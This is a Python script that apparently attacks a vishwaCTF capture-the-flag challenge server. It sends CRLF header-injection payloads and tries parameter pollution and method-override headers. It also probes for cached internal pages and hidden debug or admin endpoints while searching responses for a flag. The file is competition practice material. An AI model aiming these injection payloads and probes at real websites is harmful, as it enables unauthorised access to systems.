#!/usr/bin/env python3
"""Advanced Ghost Pipeline Attack - Header injection, cache poisoning, etc."""
import requests
import re
import urllib.parse

BASE_URL = "https://ghost-p.vishwactf.com"

def test_header_injection():
    """Test for header injection vulnerabilities"""
    print("[*] Testing header injection...")
    
    # Try injecting headers via report_id parameter
    payloads = [
        "test\r\nX-Flag: true",
        "test\nX-Flag: true",
        "test%0d%0aX-Flag: true",
        "test%0aX-Flag: true",
    ]
    
    for payload in payloads:
        try:
            r = requests.get(f"{BASE_URL}/dashboard", params={"report_id": payload}, timeout=5)
            print(f"[+] Payload: {payload}")
            print(f"    Headers: {dict(r.headers)}")
            if "vishwaCTF{" in r.text or "X-Flag" in str(r.headers):
                print(f"    Response: {r.text}")
                if "vishwaCTF{" in r.text:
                    flags = re.findall(r'vishwaCTF\{[^}]+\}', r.text)
                    print(f"[!] FLAG: {flags[0]}")
                    return flags[0]
        except:
            pass

def test_cache_deception():
    """Test cache deception attacks"""
    print("\n[*] Testing cache deception...")
    
    # Try to access cached internal pages
    paths = [
        "/dashboard/admin",
        "/dashboard/internal",
        "/dashboard/flag",
        "/dashboard/secret",
        "/api/report/admin",
        "/api/report/internal",
    ]
    
    for path in paths:
        try:
            r = requests.get(f"{BASE_URL}{path}", timeout=5)
            if r.status_code == 200:
                print(f"[+] {path}: Status {r.status_code}")
                print(f"    Response: {r.text[:300]}")
                if "vishwaCTF{" in r.text:
                    flags = re.findall(r'vishwaCTF\{[^}]+\}', r.text)
                    print(f"[!] FLAG: {flags[0]}")
                    return flags[0]
        except:
            pass

def test_parameter_pollution():
    """Test HTTP parameter pollution"""
    print("\n[*] Testing parameter pollution...")
    
    # Try multiple report_id parameters
    try:
        url = f"{BASE_URL}/dashboard?report_id=1&report_id=admin&report_id=flag"
        r = requests.get(url, timeout=5)
        print(f"[+] Multiple report_id params: {r.status_code}")
        if "vishwaCTF{" in r.text:
            flags = re.findall(r'vishwaCTF\{[^}]+\}', r.text)
            print(f"[!] FLAG: {flags[0]}")
            return flags[0]
    except:
        pass

def check_debug_endpoints():
    """Check for debug/admin endpoints"""
    print("\n[*] Checking debug endpoints...")
    
    endpoints = [
        "/debug", "/admin", "/internal", "/test",
        "/_debug", "/_admin", "/_internal",
        "/api/debug", "/api/admin", "/api/internal",
        "/dashboard/debug", "/dashboard/admin",
    ]
    
    for endpoint in endpoints:
        try:
            r = requests.get(f"{BASE_URL}{endpoint}", timeout=5)
            if r.status_code == 200:
                print(f"[+] {endpoint}: Status {r.status_code}")
                print(f"    Response: {r.text[:300]}")
                if "vishwaCTF{" in r.text:
                    flags = re.findall(r'vishwaCTF\{[^}]+\}', r.text)
                    print(f"[!] FLAG: {flags[0]}")
                    return flags[0]
        except:
            pass

def test_method_override():
    """Test HTTP method override"""
    print("\n[*] Testing HTTP method override...")
    
    headers_list = [
        {"X-HTTP-Method-Override": "GET"},
        {"X-Method-Override": "GET"},
        {"X-HTTP-Method": "GET"},
    ]
    
    for headers in headers_list:
        try:
            r = requests.post(f"{BASE_URL}/api/report", headers=headers, timeout=5)
            if r.status_code != 403:
                print(f"[+] Headers {headers}: Status {r.status_code}")
                print(f"    Response: {r.text[:300]}")
                if "vishwaCTF{" in r.text:
                    flags = re.findall(r'vishwaCTF\{[^}]+\}', r.text)
                    print(f"[!] FLAG: {flags[0]}")
                    return flags[0]
        except:
            pass

def main():
    print("="*60)
    print("Advanced Ghost Pipeline Attack")
    print("="*60)
    
    test_header_injection()
    test_cache_deception()
    test_parameter_pollution()
    check_debug_endpoints()
    test_method_override()

if __name__ == "__main__":
    main()
